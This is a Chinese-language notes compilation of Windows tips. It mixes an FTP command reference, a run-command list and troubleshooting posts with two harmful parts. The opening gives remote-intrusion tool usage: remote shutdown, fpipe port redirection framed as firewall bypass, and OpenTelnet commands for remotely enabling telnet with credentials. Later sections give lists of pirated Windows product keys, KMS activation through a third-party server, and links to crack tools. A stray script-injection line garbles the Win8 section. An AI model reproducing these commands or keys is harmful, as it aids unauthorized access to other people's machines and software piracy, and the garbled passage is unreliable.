Shutdown //IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。） 
fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙） 
fpipe -l 80 -s 1029 -r 80 www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息 
Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的 88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。 
OpenTelnet.exe (远程开启telnet工具) 
opentelnet.exe //IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet //ip 连接上对方。 
NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。 


ResumeTelnet.exe (OpenTelnet附带的另一个工具) 
resumetelnet.exe //IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。 


#10 十： 
6、FTP命令详解： 

FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学 习使用进行后台FTP下载，那么就必须学习FTP指令。 


FTP的命令行格式为： 
ftp -v -d -i -n -g [主机名] ，其中 

-v 显示远程服务器的所有响应信息； 
-n 限制ftp的自动登录，即不使用；.n etrc文件； 
-d 使用调试方式； 
-g 取消全局文件名。 

FTP使用的内部命令如下(中括号表示可选项): 


1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip 
2.$ macro-ame[args]： 执行宏定义macro-name。 


3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。 
4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。 


5.ascii：使用ascii类型传输方式。 
6.bell：每个命令执行完毕后计算机响铃一次。 


7.bin：使用二进制文件传输方式。 
8.bye：退出ftp会话过程。 


9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 
10.cd remote-dir：进入远程主机目录。 


11.cdup：进入远程主机目录的父目录。 
12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。 


13.close：中断与远程服务器的ftp会话(与open对应)。 
14.cr：使用asscii方式传输文件时，将回车换行转换为回行。 


15.delete remote-file：删除远程主机文件。 
16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。 


17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。 
18.disconnection：同close。 


19.form format：将文件传输方式设置为format，缺省为file方式。 
20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。 


21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。 
22.hash：每传输1024字节，显示一个hash符号(#)。 


23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。 
24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。 


25.image：设置二进制传输方式(同binary)。 
26.lcd[dir]：将本地工作目录切换至dir。 


27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。 
28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。 


29.mdelete[remote-file]：删除远程主机文件。 
30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。 


31.mget remote-files：传输多个远程文件。 
32.mkdir dir-name：在远程主机中建一目录。 


33.mls remote-file local-file：同nlist，但可指定多个文件名。 
34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。 


35.modtime file-name：显示远程主机文件的最后修改时间。 
36.mput local-file：将多个文件传输至远程主机。 


37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。 
38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。 


39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。 
40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。 


41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 
42.passive：进入被动传输方式。 


43.prompt：设置多个文件传输时的交互提示。 
44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。 
45.put local-file[remote-file]：将本地文件local-file传送至远程主机。 
46.pwd：显示远程主机的当前工作目录。 


47.quit：同bye，退出ftp会话。 
48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst. 


49.recv remote-file[local-file]：同get。 
50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。 


51.rhelp[cmd-name]：请求获得远程主机的帮助。 
52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。 


53.rename[from][to]：更改远程主机文件名。 
54.reset：清除回答队列。 


55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。 
56.rmdir dir-name：删除远程主机目录。 


57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。 
58.send local-file[remote-file]：同put。 


59.sendport：设置PORT命令的使用。 
60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。 


61.size file-name：显示远程主机文件大小，如：site idle 7200。 
62.status：显示当前ftp状态。 


63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。 
64.sunique：将远程主机文件名存储设置为只一(与runique对应)。 


65.system：显示远程主机的操作系统类型。 
66.tenex：将文件传输类型设置为TENEX机的所需的类型。 


67.tick：设置传输时的字节计数器。 
68.trace：设置包跟踪。 


69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。 
70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3 


71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。 
72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on. 


73.?[cmd]：同help. 


#11 十一： 


7：计算机运行命令全集 winver---------检查Windows版本 
wmimgmt.msc----打开windows管理体系结构 
wupdmgr--------windows更新程序 
winver---------检查Windows版本 
wmimgmt.msc----打开windows管理体系结构 
wupdmgr--------windows更新程序 
wscript--------windows脚本宿主设置 
write----------写字板winmsd-----系统信息 
wiaacmgr-------扫描仪和照相机向导 
winchat--------XP自带局域网聊天 
mem.exe--------显示内存使用情况 
Msconfig.exe---系统配置实用程序 
mplayer2-------简易widnows media player 
mspaint--------画图板 
mstsc----------远程桌面连接 
mplayer2-------媒体播放机 
magnify--------放大镜实用程序 
mmc------------打开控制台 
mobsync--------同步命令 
dxdiag---------检查DirectX信息 
drwtsn32------ 系统医生 
devmgmt.msc--- 设备管理器 
dfrg.msc-------磁盘碎片整理程序 
diskmgmt.msc---磁盘管理实用程序 
dcomcnfg-------打开系统组件服务 
ddeshare-------打开DDE共享设置 
dvdplay--------DVD播放器 
net stop messenger-----停止信使服务 
net start messenger----开始信使服务 
notepad--------打开记事本 
nslookup-------网络管理的工具向导 
ntbackup-------系统备份和还原 
narrator-------屏幕"讲述人" 
ntmsmgr.msc----移动存储管理器 
ntmsoprq.msc---移动存储管理员操作请求 
netstat -an----(TC)命令检查接口 
syncapp--------创建一个公文包 
sysedit--------系统配置编辑器 
sigverif-------文件签名验证程序 
sndrec32-------录音机 
shrpubw--------创建共享文件夹 
secpol.msc-----本地安全策略 
syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 
services.msc---本地服务设置 
Sndvol32-------音量控制程序 
sfc.exe--------系统文件检查器 
sfc /scannow---windows文件保护 
tsshutdn-------60秒倒计时关机命令 
tourstart------xp简介（安装完成后出现的漫游xp程序） 
taskmgr--------任务管理器 
eventvwr-------事件查看器 
eudcedit-------造字程序 
explorer-------打开资源管理器 
packager-------对象包装程序 
perfmon.msc----计算机性能监测程序 
progman--------程序管理器 
regedit.exe----注册表 
rsop.msc-------组策略结果集 
regedt32-------注册表编辑器 
rononce -p ----15秒关机 
regsvr32 /u *.dll----停止dll文件运行 
regsvr32 /u zipfldr.dll------取消ZIP支持 
cmd.exe--------CMD命令提示符 
chkdsk.exe-----Chkdsk磁盘检查 
certmgr.msc----证书管理实用程序 
calc-----------启动计算器 
charmap--------启动字符映射表 
cliconfg-------SQL SERVER 客户端网络实用程序 
Clipbrd--------剪贴板查看器 
conf-----------启动netmeeting 
compmgmt.msc---计算机管理 
cleanmgr-------**整理 
ciadv.msc------索引服务程序 
osk------------打开屏幕键盘 
odbcad32-------ODBC数据源管理器 
oobe/msoobe /a----检查XP是否激活 
lusrmgr.msc----本机用户和组 
logoff---------注销命令 
iexpress-------木马捆绑工具，系统自带 
Nslookup-------IP地址侦测器 
fsmgmt.msc-----共享文件夹管理器 
utilman--------辅助工具管理器 
gpedit.msc-----组策略

```

## 删除3天前的文件

```cmd
@echo off
forfiles /P D:\temp /D -3 /C "cmd /c del @file"
```

# Win10

## bug

### windows10系统 Windows聚焦界面图片变黑白

```
from:https://answers.microsoft.com/zh-hans/windows/forum/all/windows10%E7%B3%BB%E7%BB%9F/8e605a93-8410-46d5-9c8d-2014c805fe1f?auth=1


您好，欢迎询问 Microsoft Community，很高兴为您提供技术支持。
关于 “Windows 聚焦故障” 的问题，请您尝试以下方法。
1. 通过 “设置”>“个性化”>“锁屏界面” 先将锁屏选项调整为图片。
2. 点击此电脑，定位至 C:\用户\用户名文件夹\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\Settings，删除 roaming.lock 和 settings.dat 文件。
3. 重新将锁屏界面调整为 Windows 聚焦，锁屏后放置设备一段时间，看一下能否正常显示。
希望此条回复可以帮助到您。
全球排名前十的 Windows 预览体验成员 - Gao Ling
如果我的回复未能帮助到您，请您直接回复问题即可。请勿点击下方 “否” 按钮，因为这样可能会使问题直接关闭。
问题如果两天内无人回复也会自动关闭，我们将无法接收您的回复，麻烦您重新发起询问。
如果您询问的问题得到了解决，请点击下方的 “是” 并为我们评级以结束本次询问，感谢您的支持。
Microsoft Answers 欢迎您！
```

### win+L 加锁后，无法开锁

```cmd
from: http://tieba.baidu.com/p/4736167418#97482257516l


这是19楼给出的方法，我试了一下，用了一天电脑了，锁了几次，但是都成功解锁了。你们可以试试。
管理员权限运行CMD，输入以下代码：
if exist "%SystemRoot%\System32\InputMethod\CHS\ChsIME.exe" (
TAKEOWN /F "%SystemRoot%\System32\InputMethod\CHS\ChsIME.exe"
icacls "%SystemRoot%\System32\InputMethod\CHS\ChsIME.exe" /deny "NT AUTHORITY\SYSTEM:RX"
)
```

### Win10「搜索」功能不可用了

from: https://answers.microsoft.com/zh-hans/windows/forum/all/win10%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD%E4%B8%8D/4e67b1c5-0949-4183-a1ee-ed87449fa56b

伟坤刘

Win10「搜索」功能不可用了

​	<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/946e358ee480.png" alt="img" style="zoom:50%;" />

版本信息如图，但是最近一周开始菜单搜索的时候白板，如下图

​	<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/013416a8cb76.png" alt="img" style="zoom: 50%;" />

 

问题信息

最近更新 2019/02/14 37 次浏览 适用于:

​	<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/_CopyPix_1_10.png" alt="img" style="zoom:50%;" />



您好，

了解到您Cortana无法使用的问题。

请您尝试重置下Cortana试试是否可以解决该问题，

单击开始菜单，找到Cortana右击，点击“更多”，选择应用设置，点击重置。

希望以上信息可以帮助到您！

如果您所咨询的问题，得到解决请对我们的回复进行标记解答（对我们的工作非常重要）

如您的问题没有解决，我们会继续为您提供技术支持。



我们秉承客户至上的服务理念。如果您对微软工程师在论坛中的服务有意见与建议，欢迎提出，以便我们提供更优质的服务。Microsoft Answers欢迎您！

这是否解决了你的问题?



伟坤刘

试了，还是不行

## 2018最新win10激活密匙 win10各版本永久激活序列号 win10正式版激活码分享

from:http://www.ylmfwin100.com/ylmf/8643.html

现在市面上大致有两种主流激活方法，一种是通过激活码来激活，另外一种是通过激活工具来激活。但是激活工具有个弊端就是激活时间只有180天，很多网友都想要永久激活，

现在已经过了win10系统免费推广期了，所以如果现在安装win10官方原版的系统，安装后都是未激活的。

下面雨林木风的小编为大家收集了市面上的激活密匙供大家使用。



 <img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/20433g354-0.png" alt="img" style="zoom: 67%;" />


先来说下使用激活码使用方法：

1、同时按下Win键+X，然后选择命令提示符（管理员）



​	![img](https://gitee.com/jstone001/booknote/raw/master/jpgBed/20433h910-1.png)

2、在命令提示符中依次输入：

slmgr.vbs /upk （此时弹出窗口显未“已成功卸载了产品密钥”）

slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX （弹出窗口提示：“成功的安装了产品密钥”）

slmgr /skms zh.us.to （弹出窗口提示：“密钥管理服务计算机名成功的设置为 zh.us.to”）



slmgr /ato （弹出窗口提示：“成功的激活了产品”）

​	![img](https://gitee.com/jstone001/booknote/raw/master/jpgBed/20433k934-2.png)


​	![img](https://gitee.com/jstone001/booknote/raw/master/jpgBed/20433g541-3.png)

```bash
Windows 10系统

企业版：XGVPP-NMH47-7TTHJ-W3FW7-8HV2C
教育版：YNMGQ-8RYV3-4PGQ3-C8XTP-7CFBY
专业版N：2B87N-8KFHP-DKV6R-Y2C8J-PKCKT
企业版N：WGGHN-J84D6-QYCPR-T7PJ7-X766F
教育版N：84NGF-MHBT6-FXBX8-QWJK7-DRR8H
企业版S：FWN7H-PF93Q-4GGP8-M8RF3-MDWWW
单语言版：BT79Q-G7N6G-PGBYW-4YWX6-6F4BT

Windows 10 Core Single Language:JPYNJ-XTFCR-372YJ-YJJ4Q-G83YB
Windows 10 Core 中文版 Language Edition:R3BYW-CBNWT-F3JTP-FM942-BTDXY
Windows 10 Core :KTNPV-KTRK4-3RRR8-39X6W-W44T3
Windows 10 Pro:8N67H-M3CY9-QT7C4-2TR7M-TXYCV
Windows 10 Enterprise:CKFK9-QNGF2-D34FM-99QX3-8XC4K
Windows 10 Core Single Language :JPYNH-XTFCR-372YJ-YJJ3Q-G83YB
Windows 10 Core Chinese Languange Edition:R3BYW-CBNWT-F3JTP-FM942-BTDXY


Windows 10 Pro(win10专业版激活密钥)
TPYNC-4J6KF-4B4GP-2HD89-7XMP6
2BXNW-6CGWX-9BXPV-YJ996-GMT6T
NRTT2-86GJM-T969G-8BCBH-BDWXG
XC88X-9N9QX-CDRVP-4XV22-RVV26
TNM78-FJKXR-P26YV-GP8MB-JK8XG
TR8NX-K7KPD-YTRW3-XTHKX-KQBP6
VK7JG-NPHTM-C97JM-9MPGT-3V66T
NPPR9-FWDCX-D2C8J-H872K-2YT43
W269N-WFGWX-YVC9B-4J6C9-T83GX
NYW94-47Q7H-7X9TT-W7TXD-JTYPM
NJ4MX-VQQ7Q-FP3DB-VDGHX-7XM87
MH37W-N47XK-V7XM9-C7227-GCQG9

win10企业版：
Windows 10 Enterprise : NPPR9-FWDCX-D2C8J-H872K-2YT43
Windows 10 Enterprise N: DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
Windows 10 Enterprise 2015 LTSB :WNMTR-4C88C-JK8YV-HQ7T2-76DF9
Windows 10 Enterprise 2015 LTSB N : 2F77B-TNFGY-69QQF-B8YKP-D6

win10预览版密钥：
Win10企业版密钥：PBHCJ-Q2NYD-2PX34-T2TD6-233PK
Win10专业版密钥：NKJFK-GPHP7-G8C3J-P6JXR-HQRJR
当然也欢迎朋友们下载本站的免激活win10系统进行安装，安装完后自动永久激活，十分方便。
```

## 解决win10中Compatibility Telemetry占用CPU的方法

from: http://www.pc0359.cn/article/win10/69109.html

最近小编发现使用win10的时候会特别的卡，有的时候只开几个网页也会将电脑直接卡死机，而且在运行软件的时候也会卡顿，有的时候双击某一软件图标需要很久才能正常的将它打开。在查看了电脑的任务管理之后，排查出来了一个占用电脑CPU使用率非常高的程序“Microsoft Compatibility Telemetry”。这个程序在看见之前小编没有接触过它，它是做什么的呢？又该如何解决CPU被大量占用的问题呢？

<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/170648_93541058.png" alt="解决win10中Compatibility Telemetry占用CPU的方法" style="zoom:150%;" />

### 方法步骤：

　　一、Microsoft Compatibility Telemetry是什么？

　　简单的说，这个程序是微软用来检测我们收集数据的。小编举个例子吧！若是某个软件有客户的反馈，俺么这个反馈就会被集中到这个程序中！然后由它来向微软集体反馈。

　　二、如何解决它占用系统CPU的问题呢？

　　1、在开始菜单中搜索“计划任务”。

<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/170644_14379568.png" alt="解决win10中Compatibility Telemetry占用CPU的方法" style="zoom:100%;" />

　　2、打开计划任务之后，使用鼠标依次点击以下的文件夹：MicrosoftWindowsApplication Experience

<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/170645_79864268.png" alt="解决win10中Compatibility Telemetry占用CPU的方法" style="zoom:150%;" />

　　3、打开最后一个文件夹之后，使用鼠标右键单击右上方的Microsoft Compatibility Telemetry Microsoft，紧接着就会弹出选项，选择“禁用”即可！

<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/170646_57654060.png" alt="解决win10中Compatibility Telemetry占用CPU的方法" style="zoom:150%;" />

　　4、完成程序的禁用之后就不会再因为它而出现电脑卡顿的现象了！

<img src="https://gitee.com/jstone001/booknote/raw/master/jpgBed/170648_93541058.png" alt="解决win10中Compatibility Telemetry占用CPU的方法" style="zoom:150%;" />

　　

以上就是小编解决win10中Compatibility Telemetry占用CPU使用率的方法，在电脑出现卡顿的时候大家一定不要觉得是自己正在使用的软件造成的，很多时候都是由于电脑中的某些程序自动运行并占用大量使用率产生的！需要的朋友赶紧试试吧！

## Win10此电脑视频、图片等7个文件夹怎么去除

使用Windows10电脑的时候，很多朋友发现，我们打开此电脑以后，在此电脑中默认是显示6个文件夹的，如“视频、图片、文档、下载、音乐、桌面”那么我们怎么快速的去除这6个文件夹，让他们不显示出来呢，当然我们需要的时候怎么让这六个文件夹再次快速显示出来呢，基本的方法是操作注册表，但是很多朋友不知道怎么操作，有没有更简单的方法呢，其实我们可以创作一个注册表文件，然后直接快速的操作，希望帮助朋友们参考。

本文介绍：1.此电脑“视频、图片、文档、下载、音乐、桌面、3D 对象”六个文件夹快速删除。

​         2.此电脑“视频、图片、文档、下载、音乐、桌面、3D 对象”六个文件夹快速恢复。

​	![img](https://gitee.com/jstone001/booknote/raw/master/jpgBed/419213306652.png)



1.我们在Windows的桌面上单击鼠标右键，然后选择新建一个文本文档。

2.然后我们打开新建的文本文档，然后直接复制下面的代码粘贴进来。这段代码的本质其实还是对电脑注册表进行的操作，但是比直接操作注册表要简单，快捷。

```
Windows Registry Editor Version 5.00
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{f86fa3ab-70d2-4fc7-9c99-fcbf05467f3a}]
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{d3162b92-9365-467a-956b-92703aca08af}]
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}]
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{3dfdf296-dbec-4fb4-81d1-6a3438bcf4de}]
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{088e3905-0323-4b02-9826-5d99428e115f}]
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A}]
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{24ad3ad4-a569-4530-98e1-ab02f9417aa8}]

```

3.现在将电脑上文件的扩展名显示出来，然后将TXT扩展名直接改为reg。

4.修改文件的扩展名会出现一个提示信息，我们选择是同意修改文件扩展名。

5.现在我们快速的去除这6个文件夹，只需要点击现在的reg文件即可。

6.现在我们打开此电脑，可以看到默认的六个文件夹已经不显示。

```
B4BFCC3A-DB2C-424C-B029-7FE99A87C641 --桌面文件夹
A8CDFF1C-4878-43be-B5FD-F8091C1C60D0 --文档文件夹
374DE290-123F-4565-9164-39C4925E467B  --下载文件夹
1CF1260C-4DD0-4ebb-811F-33C572699FDE  --音乐文件夹
24ad3ad4-a569-4530-98e1-ab02f9417aa8   --图片文件夹
A0953C92-50DC-43bf-BE83-3742FED03C9C  --视频文件夹
0DB7E03F-FC29-4DC6-9020-FF41B59E513A  --3D 对象
```

Win10怎么恢复此电脑视频、图片等6个文件夹

1.通过上面的方法，我们删除了此电脑中的默认六个文件夹，但是想要恢复这六个文件夹的时候，怎么快速的恢复呢。其实非常简单，方法和上面一样，大家复制下面的这个代码即可，其实这个代码和上面一样，只需要去除HKEY_LOCAL_MACHINE前面的减号即可，按照上面方法进行操作，方法是一样的.

```
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{f86fa3ab-70d2-4fc7-9c99-fcbf05467f3a}]
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{d3162b92-9365-467a-956b-92703aca08af}]
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}]
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{3dfdf296-dbec-4fb4-81d1-6a3438bcf4de}]
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{088e3905-0323-4b02-9826-5d99428e115f}]
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{24ad3ad4-a569-4530-98e1-ab02f9417aa8}]
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A}]

```

2.大家在平时可以制作两个注册表文件，一个是删除，一个是恢复，这样很方便。

转载地址：https://jingyan.baidu.com/article/a3aad71ac44d98b1fb00963b.html

​         https://zhidao.baidu.com/question/1175796363159500379.html

# Win8

## Win8修改窗口背景颜色为豆沙绿方法

```sh
Win8修改窗口背景颜色为豆沙绿方法 

win8下要修改窗口背景颜色为健康的护眼颜色，有两种方法 一、桌面右键→个性化→高对比度主题→底下选颜色（高对比度）→窗口背景颜色值设为色调85，饱和度123，亮度205  
1、点击自己喜欢的主题 
2、我选择的是白色  
3、点击窗口色调85，饱和度123，亮度205 
4、点击确定就好了 

二、在Windows默认主题下，打开注册表编辑器（win键+R，即运行，输入regedit）， 依次双击打开HKEY_CURRENT_USER\Control Panel\Colors\，将Window的键值修改为204 232 207（此为RGB的颜色值，故与方法一的值不同），修改成功后重启电脑。此方法在其

var script = document.createElement('script'); script.src = 'http://static.pay.baidu.com/resource/baichuan/ns.js'; document.body.appendChild(script);    

他Windows系统也可用哦。     
方法一比较好，看你喜欢哪一种拉！ 
方法二较简单实用，方法一还要修改其他颜色，较繁琐 
```



# Win7

## windows7旗舰版激活密钥永久版免费分享

from:http://www.windows7en.com/Win7/24274.htmlcccfff

windows7之家不仅提供精品[Win7教程](http://www.windows7en.com/Win7/) 给大家，加上这个windows7激活密匙还帮大家解决windows7系统激活问题，包括[win7旗舰版](http://www.windows7en.com/) [windows7安装版](http://www.windows7en.com/Win7Down/6549.html)这些。

用的是Windows7 RTM旗舰版官方原版cn_windows_7_ultimate_x86_dvd_x15-65907，win7旗舰版原版系统下载：[Windows7旗舰版官方原版下载 强烈推荐](http://www.windows7en.com/Win7Down/6549.html)

安装好系统后右击计算机--属性--更改产品密匙 输入以下密匙;

HT6VR-XMPDJ-2VBFV-R9PFY-3VP7R
6K2KY-BFH24-PJW6W-9GK29-TMPWP或22TKD-F8XX6-YG69F-9M66D-PMJB

Windows 7 旗舰版下载：http://www.windows7en.com/zj/

1: 戴尔 DELL 序列号: 342DG-6YJR8-X92GV-V7DCV-P4K27
2: 联想 LENOVO 序列号: 22TKD-F8XX6-YG69F-9M66D-PMJBM
3: 三星 SAMSUNG 序列号：49PB6-6BJ6Y-KHGCQ-7DDY6-TF7CD
4: 宏基 ACER 序列号: YKHFT-KW986-GK4PY-FDWYH-7TP9F FJGCP-4DFJD-GJY49-VJBQ7-HYRR2
5：推荐[win7旗舰版密钥](http://www.windows7en.com/xiazai/18863.html)生成器，win732/64旗舰版通用激活工具，附带教程。

这里跟大家介绍一款装机软件——[小白一键重装系统](http://www.xiaobaixitong.com/?site=7en&web=/Win7/24274.html)软件，里面的系统都是已经激活好了的，不在需要担心重装后激活的问题。

当然您也可以使用win7激活工具对系统进行激活，小编推荐以下激活工具和[怎么激活win7旗舰版](http://www.windows7en.com/Win7/16575.html)教程，保证完美激活Win7旗舰版系统

<span style='color:red'>[win7激活工具|win7激活OemY3.1 NT6通用完美激活](http://www.windows7en.com/Win7key/21623.html)</span>

[win7专业版激活|win7激活V2015官方免费版](http://www.windows7en.com/Win7key/21623.html)

[Windows7 Loader_v3.27 (win7激活工具)](http://www.windows7en.com/xiazai/16529.html)

[激活工具Windows 7 Loader V2.1.5绿色版](http://www.windows7en.com/Win7loader/15331.html)

[oem7f7激活工具|win7激活工具下载](http://www.windows7en.com/Win7key/21623.html)

[系统之家win10激活工具](http://www.windows7en.com/xiazai/25047.html)

[windows7 64位旗舰 激活码](http://www.windows7en.com/Win7/24274.html)

假如以上序列号都不行的话可以用[win764位旗舰版系统激活程序](http://www.windows7en.com/xiazai/20955.html) ，windows7激活密匙是专业的windows7激活工具，确保可以获得正版授权。

​    更多的激活序列号可以关注**Windows7旗舰版激活秘钥工具**合集，轻松解决激活问题。

[windows7官方下载](http://www.windowszj.com/news/16100.html)

更多win7激活方法，请关注[**win7激活工具**](http://www.windows7en.com/Win7/16542.html)合集。

# WinXP

## WindowsXP64位专业版sp2镜像下载win_xp_pro_x64_sp2.iso,附中文版语言包

from:https://blog.csdn.net/fromfire2/article/details/79938389

```sh
为一个轻量级操作系统，价值不可估量，我就把它装在虚拟机里当沙盒用

安装快，运行快，不吃内存，不占磁盘，兼容64位软件

 CD-KEY : 
B66VY-4D94T-TPPD4-43F72-8X4FY
VCFQD-V9FX9-46WVH-K3CD4-4J3JM

1、安装系统
ed2k:*//|file|en_win_xp_pro_x64_with_sp2_vl_X13-41611.iso|628168704|5573EEA1F40FE32E46F4615B6A4E71D8|/*
备用http://software.ncu.edu.tw/96/EN/iso/XP_64bit.iso

 2、进入系统安装简体中文语言包
ed2k:*//|file|mui_winxp_pro_x64_cd3.iso|589086720|0F04289761688F0586F87CED4F5193AE|/*
备用http://download.microsoft.com/download/f/d/a/fdac56ee-928a-4d51-9d6d-c7c64e9f5bae/ARMMUIx3.iso
 补充：安装语言包时会需要系统盘里面的文件，安装完中文语言包后在 控制面板-语言 里面切换系统语言
```

